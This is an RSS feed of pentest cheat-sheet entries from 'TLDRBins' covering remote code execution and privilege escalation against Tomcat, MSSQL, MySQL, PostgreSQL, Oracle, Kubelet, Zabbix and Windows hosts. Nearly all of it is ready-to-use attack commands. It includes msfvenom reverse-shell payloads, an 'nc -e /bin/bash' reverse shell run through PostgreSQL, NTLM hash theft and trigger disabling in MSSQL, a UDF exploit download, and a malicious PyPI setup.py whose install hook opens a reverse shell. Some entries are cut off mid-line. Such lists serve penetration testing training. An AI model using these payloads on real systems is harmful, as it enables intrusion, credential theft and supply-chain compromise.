channel.title: RCE on TLDRBins
channel.description: Recent content in RCE on TLDRBins

item.title: Apache Tomcat
item.description: Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war -o revshell.war 2. Start a listener rlwrap nc -lvnp <LOCAL_PORT> 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1. Login to Tomcat Web Application Manager | | 2. WAR file to deploy -> Deploy | | 3. Click /revshell in Applications table | +--------------------------------------------+ curl -u '<USER>:<PASSWORD>' http://<DOMAIN>:8080/manager/text/deploy?path=/revshell --upload-file revshell.

item.title: evil-winrm
item.description: Connection Methods Password Hash Kerberos crt & key evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>' evil-winrm -i <TARGET> -u <USER> -H <HASH> # Step 1: Edit '/etc/krb5.conf' (All in uppercase) [libdefaults] default_realm = <DOMAIN> [realms] <DOMAIN> = { kdc = <DC>:88 admin_server = <DC> default_domain = <DOMAIN> } [domain_realm] .domain.internal = <DOMAIN> domain.internal = <DOMAIN> # Step 2: export .ccache export KRB5CCNAME=<CCACHE> # Step 3: Connect sudo ntpdate -s <DC> && evil-winrm -i <TARGET> -r <DC> evil-winrm -i <TARGET> -S -k auth.

item.title: ExecuteDCOM
item.description: Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<POWERSHELL_3_BASE64>' -silentcommand -object MMC20

item.title: Kubelet
item.description: Basic Commands # List all the pods on the node kubeletctl pods -s <TARGET> # List running pods kubeletctl runningpods -s <TARGET> # Exec command kubeletctl exec "/bin/bash" -p <POD_NAME> -c <CONTAINER_NAME> -s <TARGET> Ref: kubeletctl

item.title: Metasploit Shellcode
item.description: Generate Shellcode Note: stageless payload can catch with nc directly Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll Windows x86 Staged exe Stageless exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.

item.title: MSSQL Privilege Escalation
item.description: Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 Method 1 Method 2 Method 3 xp_dirtree '\\<LOCAL_IP>\any\thing'; use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing'; load_file('\\<LOCAL_IP>\any\thing'); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: Mysql Privilege Escalation
item.description: Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p<PASSWORD> mysql # UDF create table foo(line blob); insert into foo values(load_file('/dev/shm/raptor_udf2.so')); # Get plug-in directory show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.

item.title: Oracle Database
item.description: Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT Enum # SID enum (You only need one) odat sidguesser -s <TARGET> # User/Password brute force odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba General # Export everytime or add to ~/.

item.title: Postgresql
item.description: Connect psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME> psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>' Basic # Show databases \list # Use database \connect <DB_NAME> # Show tables in current database \dt # Dump data from table select * from <TABLE_NAME>; # Insert data into table (e.g) insert into <TABLE_NAME> (username, password, role) values ('user', 'password', 'admin'); # Write text copy (select '<STRING>') to '/var/lib/postgresql/.profile'; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash <LOCAL_IP> <LOCAL_PORT> &'

item.title: Pypi
item.description: Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("<LOCAL_IP>",<LOCAL_PORT>)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call(["/bin/sh", "-i"]) setup(name="evil_package", version="1.0.0", description="Evil Package", author="user", author_email="user@<DOMAIN>", url="http://<DOMAIN>", license="MIT", zip_safe=False, cmdclass={"install": Exploit}) 3.

item.title: Zabbix
item.description: Zabbix API General # Auth with cred curl <TARGET>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "<USER>", "password": "<PASSWORD>"}}' # Get users curl -s <TARGET>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.get", "id":1, "auth":"<AUTH>", "params":{"output": "extend"}}' | jq . # Get hosts curl -s <TARGET>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"<AUTH>", "params":{}}' | jq . # Get user group info curl -s <TARGET>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.
